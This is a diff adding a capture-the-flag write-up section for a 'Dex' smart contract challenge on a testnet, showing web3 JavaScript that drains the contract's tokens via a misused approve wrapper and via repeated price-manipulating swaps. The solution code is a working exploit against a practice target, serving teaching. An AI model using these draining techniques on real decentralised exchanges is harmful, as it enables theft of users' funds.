@@ -210,3 +210,56 @@ Compile [Deny.sol](./solutions/Deny.sol) and deploy it to the Rinkeby testnet wi
 
 Compile [Buyer.sol](./solutions/Buyer.sol) and deploy it to the Rinkeby testnet with e.g. Remix IDE and MetaMask (Injected Web3).
 Afterwards, just call the `buy(address _shopContract)` function with the level `instance` address as first argument.
+
+
+## 22. Dex
+
+Take a close look at this function of the `Dex` contract while considering how the `approve` function of an `ERC20` contract works:
+```
+function approve(address spender, uint amount) public {
+  SwappableToken(token1).approve(spender, amount);
+  SwappableToken(token2).approve(spender, amount);
+}
+```
+The `approve` function of an `ERC20` contract allows the `spender` to transfer `amount` of tokens from the `msg.sender`.
+In this case the `msg.sender` is the `Dex` contract, therefore we can easily drain the tokens from the contract by calling the `transferFrom` function of the token `ERC20` contracts.  
+Example for 'Token 1':
+```
+await contract.approve(player, 100);
+const addressToken1 = await contract.token1();
+
+const transferSig = web3.eth.abi.encodeFunctionSignature("transferFrom(address,address,uint256)");
+const transferParams = web3.eth.abi.encodeParameters(["address", "address", "uint256"], [contract.address, player, 100]);
+const transferData = transferSig + transferParams.slice(2);
+
+await web3.eth.sendTransaction({ from: player, to: addressToken1, data: transferData });
+```
+This works as expected if the challenge is deployed on a local testnet. However, it does not work with the actual level which is currently (as of 2022-02-12) deployed on the Rinkeby testnet.
+I observed in the tokens' `Approve` events that the `msg.sender` is not the address of the `Dex` contract but the `player` address. This means that the level is not using the same code which is shown to us.
+Probably the underlying `ERC20` contract code was locally modified to use `tx.origin` instead of `msg.sender`, but this is just a wild guess.
+
+
+However, we can still solve the level by beating the price logic of the smart contract:
+```
+await contract.approve(instance, 110); // approve contract to spend max. amout of tokens player could possibly have
+const addressToken1 = await contract.token1();
+const addressToken2 = await contract.token2();
+
+// just swap tokens back and forth
+await contract.swap(addressToken1, addressToken2, await contract.balanceOf(addressToken1, player));
+await contract.swap(addressToken2, addressToken1, await contract.balanceOf(addressToken2, player));
+// --> player has 24 of 'Token 1'
+
+
+// just swap tokens back and forth, again
+await contract.swap(addressToken1, addressToken2, await contract.balanceOf(addressToken1, player));
+await contract.swap(addressToken2, addressToken1, await contract.balanceOf(addressToken2, player));
+// --> player has 41 of 'Token 1'
+
+// we are getting closer ...
+await contract.swap(addressToken1, addressToken2, await contract.balanceOf(addressToken1, player));
+// --> player has 65 of 'Token 2', and Dex has 110 of 'Token 1' and 45 of 'Token 2'
+await contract.swap(addressToken2, addressToken1, await contract.balanceOf(addressToken2, instance));
+// --> player has 110 of 'Token 1' and 20 of 'Token 2', and Dex has 0!!! of 'Token 1' and 90 of 'Token 2'
+// DONE!
+```
